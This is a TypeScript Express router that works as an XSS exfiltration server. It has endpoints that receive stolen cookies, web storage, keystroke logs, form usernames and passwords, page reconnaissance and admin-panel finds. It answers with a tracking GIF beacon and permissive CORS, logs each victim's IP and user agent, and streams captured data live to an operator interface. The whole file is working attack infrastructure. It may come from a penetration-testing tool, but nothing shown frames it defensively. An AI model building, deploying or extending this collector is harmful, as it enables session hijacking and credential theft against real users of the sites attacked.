import { Router, type IRouter, type Request, type Response } from "express";
import cors from "cors";
import { randomBytes } from "crypto";

const router: IRouter = Router();

// ── In-memory ring buffer (max 500 events) ────────────────────────────────────
const MAX_ITEMS = 500;
const ring: CollectEvent[] = [];
const listeners = new Set<Response>();

export interface CollectEvent {
  id: string;
  ts: string;
  type: "cookie" | "storage" | "keylog" | "form" | "recon" | "admin" | "test" | "raw";
  source: string;
  ip: string;
  ua: string;
  data: Record<string, unknown>;
}

function getIp(req: Request): string {
  const fwd = req.headers["x-forwarded-for"];
  if (typeof fwd === "string") return fwd.split(",")[0].trim();
  return req.socket?.remoteAddress ?? "unknown";
}

function classifyPayload(body: Record<string, unknown>): CollectEvent["type"] {
  if (body.cookies || body.cookie) return "cookie";
  if (body.localStorage || body.sessionStorage) return "storage";
  if (body.log) return "keylog";
  if (body.form || body.u || body.p) return "form";
  if (body.links !== undefined && body.metaTags !== undefined) return "recon";
  if (body.admin_found !== undefined) return "admin";
  if (body.test === true) return "test";
  return "raw";
}

function addEvent(ev: CollectEvent) {
  ring.push(ev);
  if (ring.length > MAX_ITEMS) ring.shift();
  // Broadcast to all SSE listeners
  const line = `data: ${JSON.stringify(ev)}\n\n`;
  for (const res of listeners) {
    try { res.write(line); } catch { listeners.delete(res); }
  }
}

// Transparent 1×1 GIF
const GIF1x1 = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");

const corsAll = cors({ origin: "*", methods: ["GET", "POST", "DELETE", "OPTIONS"] });

// ── OPTIONS preflight (for cross-origin XSS payloads) ────────────────────────
router.options("/collect",        corsAll, (_req, res) => { res.sendStatus(204); });
router.options("/collect/clear",  corsAll, (_req, res) => { res.sendStatus(204); });

// ── GET /collect — image beacon (no-cors safe) ────────────────────────────────
router.get("/collect", corsAll, (req, res): void => {
  const q = req.query as Record<string, string>;
  const ev: CollectEvent = {
    id: randomBytes(4).toString("hex"),
    ts: new Date().toISOString(),
    type: classifyPayload(q as Record<string, unknown>),
    source: q.domain ?? q.url ?? "unknown",
    ip: getIp(req),
    ua: req.headers["user-agent"] ?? "",
    data: q as Record<string, unknown>,
  };
  addEvent(ev);
  res.setHeader("Content-Type", "image/gif");
  res.setHeader("Cache-Control", "no-store");
  res.send(GIF1x1);
});

// ── POST /collect — fetch with Content-Type JSON ──────────────────────────────
router.post("/collect", corsAll, (req, res): void => {
  const body = (req.body ?? {}) as Record<string, unknown>;
  const ev: CollectEvent = {
    id: randomBytes(4).toString("hex"),
    ts: new Date().toISOString(),
    type: classifyPayload(body),
    source: (body.domain ?? body.url ?? "unknown") as string,
    ip: getIp(req),
    ua: req.headers["user-agent"] ?? "",
    data: body,
  };
  addEvent(ev);
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.json({ ok: true });
});

// ── GET /collect/stream — SSE feed (tool UI listens here) ─────────────────────
router.get("/collect/stream", (req, res): void => {
  res.setHeader("Content-Type",  "text/event-stream");
  res.setHeader("Cache-Control", "no-cache, no-transform");
  res.setHeader("Connection",    "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  // Replay last 50 events for new connections
  const replay = ring.slice(-50);
  for (const ev of replay) {
    try { res.write(`data: ${JSON.stringify(ev)}\n\n`); } catch { /* skip */ }
  }

  listeners.add(res);
  const hb = setInterval(() => {
    try { res.write(": ping\n\n"); }
    catch { clearInterval(hb); listeners.delete(res); }
  }, 15_000);

  req.on("close", () => { clearInterval(hb); listeners.delete(res); });
});

// ── GET /collect/stats ────────────────────────────────────────────────────────
router.get("/collect/stats", (_req, res): void => {
  const counts = ring.reduce<Record<string, number>>((acc, ev) => {
    acc[ev.type] = (acc[ev.type] ?? 0) + 1;
    return acc;
  }, {});
  res.json({ total: ring.length, counts, listeners: listeners.size });
});

// ── DELETE /collect — clear ring buffer ────────────────────────────────────────
router.delete("/collect/clear", corsAll, (_req, res): void => {
  ring.length = 0;
  res.json({ ok: true, cleared: true });
});

export default router;
